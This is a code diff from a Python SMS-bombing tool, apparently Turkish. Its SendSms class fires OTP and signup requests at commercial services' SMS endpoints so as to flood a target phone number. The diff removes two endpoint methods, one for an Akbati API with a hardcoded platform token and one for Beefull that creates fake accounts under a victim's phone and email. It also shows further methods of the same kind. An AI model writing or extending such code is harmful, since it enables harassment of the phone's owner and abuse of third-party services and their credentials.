@@ -242,21 +242,7 @@ class SendSms():
         
     
         
-    #akbati.com
-    def Akbati(self):
-        try:
-            url = "https://akbatiapi.poilabs.com:443/v1/en/sms"
-            headers = {"Accept": "*/*", "Content-Type": "application/json", "X-Platform-Token": "a2fe21af-b575-4cd7-ad9d-081177c239a3", "User-Agent": "Akdbat", "Accept-Language": "en-BA;q=1.0, tr-BA;q=0.9, bs-BA;q=0.8"}
-            json={"phone": self.phone}
-            r = requests.post(url=url, headers=headers, json=json, timeout=6)
-            if r.json()["result"] == "SMS sended succesfully!":
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> akbatiapi.poilabs.com")
-                self.adet += 1
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> akbatiapi.poilabs.com")
-        
+ 
 
     #komagene.com.tr
     def Komagene(self):
@@ -354,23 +340,7 @@ class SendSms():
             print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> app.buyursungelsin.com")
     
 
-    #beefull.com
-    def  Beefull(self):
-        try:
-            url = "https://app.beefull.io:443/api/inavitas-access-management/signup"
-            json={"email": self.mail, "firstName": "Memati", "language": "tr", "lastName": "Bas", "password": "123456", "phoneCode": "90", "phoneNumber": self.phone, "tenant": "beefull", "username": self.mail}
-            requests.post(url, json=json, timeout=4)
-            url = "https://app.beefull.io:443/api/inavitas-access-management/sms-login"
-            json={"phoneCode": "90", "phoneNumber": self.phone, "tenant": "beefull"}
-            r = requests.post(url, json=json, timeout=4)
-            if r.status_code == 200:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> app.beefull.io")
-                self.adet += 1
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> app.beefull.io")
-
+    
 
     #dominos.com.tr
     def Dominos(self):
